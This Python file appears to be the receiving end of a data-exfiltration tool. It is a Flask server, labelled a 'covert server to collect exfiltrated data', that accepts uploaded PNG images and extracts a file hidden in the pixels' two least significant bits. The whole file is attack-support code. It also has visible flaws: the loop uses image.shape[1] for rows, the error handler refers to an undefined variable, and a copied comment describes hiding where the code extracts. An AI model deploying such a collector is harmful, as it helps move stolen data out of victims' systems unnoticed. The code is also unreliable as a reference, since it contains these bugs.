#!/usr/bin/python3
"""@package CovertServer covert server to collect exfiltrated data
"""

import sys
import cv2
from bitstring import BitArray
import numpy as np
import json
from flask import Flask, request

# Path to write exfiltrated image to on disk and extract hidden file data from
default_path_to_image = "exfiltrated.png"

# Path to write extracted file data to on disk
default_path_to_data = "extracted.txt"


app = Flask(__name__)
@app.route('/', methods=['POST'])
def post_image():
    """!@brief Parses image file from POST request and writes it to disk. 
        The flask server calls this function when it recieves a post request to the root
        directory.
    @return Always returns 200 OK HTTP reponse
    """
    f = request.files['file']
    try:
        fd = open(default_path_to_image, "wb")
        fd.write(f.read())
        fd.close()
    except:
        print("Failed to write image to disk.")
    extract_data(default_path_to_image, default_path_to_data)
    return json.dumps({'success':True}), 200, {'ContentType':'application/json'}


def extract_data(path_to_image, path_to_file):
    """!@brief Extracts a hidden file from the two lowest significant bits of color components
        (Red, Green, Blue) in pixels of the image. Writes extracted file to the disk.
    @param path_to_image Relative path to image to extract hidden file from
    @param data_file Relative path to file to write extracted data to
    """
    image = cv2.imread(path_to_image, 1)
    
    data_size_bits = BitArray()
    data_size = 0
    data_bits = BitArray()
    size_reads = 0
    data_reads = 0
    done_copying = False
    
    """
    Iterates through each row of the image array, then through each pixel of the row, then
    through all three color components (Red, Green, Blue) of the pixel. Replaces the two
    least significant bits of the color component with the next two bits from the data
    bitarray until it stores the entire data bitarray in the image.
    """
    for i in range(image.shape[1]):
        for j in range(len(image[i])):
            done_hiding = False
            for k in range(len(image[i][j])):
                color_component = image[i][j][k]
                color_bits = BitArray(uint=color_component, length=8)
                # Extract file size header to determine how much data to read from image for file
                if size_reads < 13:
                    data_size_bits.insert(color_bits[-2:], len(data_size_bits))
                    size_reads = size_reads + 1
                    if size_reads == 13:
                        data_size = np.uint32(data_size_bits.uint)
                    continue
                # Copies data until it reaches end of file data as determined by
                # extracted file size header
                if data_reads < (data_size/2):
                    data_bits.insert(color_bits[-2:], len(data_bits))
                    data_reads = data_reads + 1    
                else:
                    done_hiding = True
                    break
            if done_hiding:
                break
        if done_hiding:
            break
    try:   
        fd = open(path_to_file, "wb")
        fd.write(data_bits.bytes)
        fd.close()
    except:
        print("Failed to write extracted data to file " + default_path_to_write_data + ".")
        sys.exit()
